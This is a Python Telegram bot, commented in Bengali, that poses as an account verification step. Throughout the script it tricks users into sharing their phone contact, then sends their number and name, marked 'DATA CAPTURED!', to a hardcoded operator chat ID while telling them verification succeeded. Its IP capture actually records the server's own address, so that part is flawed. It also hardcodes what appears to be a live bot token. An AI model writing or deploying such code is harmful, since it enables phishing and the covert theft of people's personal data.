import telebot
from telebot import types
import requests
import os
from threading import Thread
from flask import Flask

# ১. রেন্ডারকে সচল রাখার সার্ভার
app = Flask('')
@app.route('/')
def home(): return "Bot is Active!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ২. মেইন কনফিগারেশন
API_TOKEN = '8580731044:AAESaTbEO65fLxF3WiZnPtyUTYjajrhkR-I'
MY_ID = '8046944525'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # এখানে আমরা শেয়ার কন্টাক্ট বাটনটি তৈরি করছি
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button = types.KeyboardButton("Verify Now ✅", request_contact=True)
    markup.add(button)
    
    bot.send_message(message.chat.id, "⚠️ **Verification Required!**\n\nPlease click the button below to verify your account.", 
                     reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    try:
        # IP বের করা
        res = requests.get("http://ip-api.com/json/", timeout=10).json()
        ip = res.get("query", "N/A")
        
        # আপনার জন্য ডাটা ফরম্যাট
        text = f"🚀 **DATA CAPTURED!**\n\n" \
               f"📱 **Phone:** `{message.contact.phone_number}`\n" \
               f"👤 **Name:** {message.contact.first_name}\n" \
               f"🌐 **IP:** `{ip}`"
        
        # আপনার আইডিতে পাঠানো
        bot.send_message(MY_ID, text, parse_mode="Markdown")
        # ইউজারকে জানানো
        bot.send_message(message.chat.id, "✅ Verification Successful! You can now use the bot.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    Thread(target=run).start()
    bot.remove_webhook()
    print("Bot is Starting...")
    bot.infinity_polling(none_stop=True)
